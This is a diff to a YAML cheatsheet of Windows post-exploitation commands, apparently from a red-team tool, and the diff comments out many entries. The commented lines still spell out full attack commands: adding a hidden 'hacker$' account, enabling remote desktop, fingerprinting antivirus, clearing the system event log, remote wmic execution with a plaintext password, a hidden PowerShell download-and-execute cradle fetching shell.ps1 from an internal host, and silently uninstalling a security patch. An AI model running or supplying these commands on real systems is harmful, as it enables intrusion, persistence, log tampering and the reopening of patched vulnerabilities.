@@ -9,10 +9,10 @@ cheatsheet:
     description: add user to admin group
     privilege: administrator
 
-  -
-    cmd: mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"cmd.exe\",\"/c net user hacker$ 123456@cctv /add\",\"\",\"runas\",1)(window.close)
-    description: add new user (need to be turned off UAC!)
-    privilege: user
+  # -
+  #   cmd: mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"cmd.exe\",\"/c net user hacker$ 123456@cctv /add\",\"\",\"runas\",1)(window.close)
+  #   description: add new user (need to be turned off UAC!)
+  #   privilege: user
 
   -
     cmd: whoami /all /fo list
@@ -49,15 +49,15 @@ cheatsheet:
     description: registry add startup items (HKCU)
     privilege: administrator
 
-  -
-    cmd: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v portnumber /d 3389 /f
-    description: open 3389 remote desktop (step_1:set remote desktop port)
-    privilege: administrator
+  # -
+  #   cmd: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v portnumber /d 3389 /f
+  #   description: open 3389 remote desktop (step_1:set remote desktop port)
+  #   privilege: administrator
 
-  -
-    cmd: wmic RDTOGGLE WHERE ServerName=\"%COMPUTERNAME%\" call SetAllowTSConnections 1 && netstat -an|findstr 3389
-    description: open 3389 remote desktop (step_2:wmic opens remote desktop)
-    privilege: administrator
+  # -
+  #   cmd: wmic RDTOGGLE WHERE ServerName=\"%COMPUTERNAME%\" call SetAllowTSConnections 1 && netstat -an|findstr 3389
+  #   description: open 3389 remote desktop (step_2:wmic opens remote desktop)
+  #   privilege: administrator
 
   -
     cmd: sc query
@@ -84,15 +84,15 @@ cheatsheet:
     description: displays all wireless network configurations on the local computer
     privilege: user
 
-  -
-    cmd: netsh interface ipv4 show config
-    description: display local ip address and other network info
-    privilege: user
+  # -
+  #   cmd: netsh interface ipv4 show config
+  #   description: display local ip address and other network info
+  #   privilege: user
 
-  -
-    cmd: netsh interface ipv4 set dnsservers name=\"WLAN 2\" static 10.0.0.1 primary
-    description: modify dns config
-    privilege: administrator
+  # -
+  #   cmd: netsh interface ipv4 set dnsservers name=\"WLAN 2\" static 10.0.0.1 primary
+  #   description: modify dns config
+  #   privilege: administrator
 
   -
     cmd: arp -a
@@ -109,60 +109,60 @@ cheatsheet:
     description: enumerate summaries of all processes
     privilege: user
 
-  -
-    cmd: wmic useraccount list full
-    description: list all info of all local users
-    privilege: user
+  # -
+  #   cmd: wmic useraccount list full
+  #   description: list all info of all local users
+  #   privilege: user
 
-  -
-    cmd: wmic share list
-    description: list all shared resources locally
-    privilege: user
+  # -
+  #   cmd: wmic share list
+  #   description: list all shared resources locally
+  #   privilege: user
 
-  -
-    cmd: wmic service get caption,name,startmode,state
-    description: list services
-    privilege: user
+  # -
+  #   cmd: wmic service get caption,name,startmode,state
+  #   description: list services
+  #   privilege: user
 
-  -
-    cmd: wmic product get name
-    description: get a list of installed apps
-    privilege: user
+  # -
+  #   cmd: wmic product get name
+  #   description: get a list of installed apps
+  #   privilege: user
 
-  -
-    cmd: wmic sysdriver get caption,name,pathname,servicetype,state,status /format:list
-    description: get driver info
-    privilege: user
+  # -
+  #   cmd: wmic sysdriver get caption,name,pathname,servicetype,state,status /format:list
+  #   description: get driver info
+  #   privilege: user
 
-  -
-    cmd: wmic os get /format:list
-    description: get operating system details
-    privilege: user
+  # -
+  #   cmd: wmic os get /format:list
+  #   description: get operating system details
+  #   privilege: user
 
-  -
-    cmd: wmic onboarddevice get description,devicetype,enabled
-    description: determine whether the system is a virtual machine through onboard info
-    privilege: user
+  # -
+  #   cmd: wmic onboarddevice get description,devicetype,enabled
+  #   description: determine whether the system is a virtual machine through onboard info
+  #   privilege: user
 
-  -
-    cmd: wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get DisplayName,PathToSignedProductExe
-    description: Enumerates info about the target anti-virus product
-    privilege: user
+  # -
+  #   cmd: wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get DisplayName,PathToSignedProductExe
+  #   description: Enumerates info about the target anti-virus product
+  #   privilege: user
 
-  -
-    cmd: wmic startup get caption,command,location,user
-    description: view startup items
-    privilege: user
+  # -
+  #   cmd: wmic startup get caption,command,location,user
+  #   description: view startup items
+  #   privilege: user
 
-  -
-    cmd: wmic nteventlog where filename=\"system\" cleareventlog
-    description: clear system log records
-    privilege: administrator
+  # -
+  #   cmd: wmic nteventlog where filename=\"system\" cleareventlog
+  #   description: clear system log records
+  #   privilege: administrator
 
-  -
-    cmd: wmic /node:192.168.123.113 /password:\"123456\" /user:\"administrator\" process call create \"cmd.exe /c shutdown /p\"
-    description: execute commands remotely
-    privilege: user
+  # -
+  #   cmd: wmic /node:192.168.123.113 /password:\"123456\" /user:\"administrator\" process call create \"cmd.exe /c shutdown /p\"
+  #   description: execute commands remotely
+  #   privilege: user
 
   -
     cmd: net view /domain:XXX
@@ -244,42 +244,42 @@ cheatsheet:
     description: install msi installation package
     privilege: user
 
-  -
-    cmd: powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.200:7789/shell.ps1')\";
-    description: powerShell load remote script
-    privilege: user
+  # -
+  #   cmd: powershell -windowstyle hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.200:7789/shell.ps1')\";
+  #   description: powerShell load remote script
+  #   privilege: user
 
-  -
-    cmd: mshta vbscript:msgbox(\"hello\",36,\"are you ok?\")(window.close)
-    description: pop up message box
-    privilege: user
+  # -
+  #   cmd: mshta vbscript:msgbox(\"hello\",36,\"are you ok?\")(window.close)
+  #   description: pop up message box
+  #   privilege: user
 
-  -
-    cmd: mshta vbscript:CreateObject(\"sapi.spvoice\").speak(\"Hello!I am Hacker\")(window.close)
-    description: voice reading
-    privilege: user
+  # -
+  #   cmd: mshta vbscript:CreateObject(\"sapi.spvoice\").speak(\"Hello!I am Hacker\")(window.close)
+  #   description: voice reading
+  #   privilege: user
 
-  -
-    cmd: mshta vbscript:CreateObject(\"Shell.Application\").MinimizeAll()(window.close)
-    description: minimize the desktop window
-    privilege: user
+  # -
+  #   cmd: mshta vbscript:CreateObject(\"Shell.Application\").MinimizeAll()(window.close)
+  #   description: minimize the desktop window
+  #   privilege: user
 
-  -
-    cmd: rundll32 user32.dll,LockWorkStation
-    description: lock screen
-    privilege: user
+  # -
+  #   cmd: rundll32 user32.dll,LockWorkStation
+  #   description: lock screen
+  #   privilege: user
 
-  -
-    cmd: rundll32 powrprof.dll,SetSuspendState
-    description: put the computer to sleep
-    privilege: user
+  # -
+  #   cmd: rundll32 powrprof.dll,SetSuspendState
+  #   description: put the computer to sleep
+  #   privilege: user
 
-  -
-    cmd: rundll32 url.dll,FileProtocolHandler https://github.com/Ptkatz
-    description: open the Web page
-    privilege: user
+  # -
+  #   cmd: rundll32 url.dll,FileProtocolHandler https://github.com/Ptkatz
+  #   description: open the Web page
+  #   privilege: user
 
-  -
-    cmd: wusa /uninstall /kb:4012598 /quiet /norestart
-    description: uninstall the KB patch
-    privilege: user
+  # -
+  #   cmd: wusa /uninstall /kb:4012598 /quiet /norestart
+  #   description: uninstall the KB patch
+  #   privilege: user
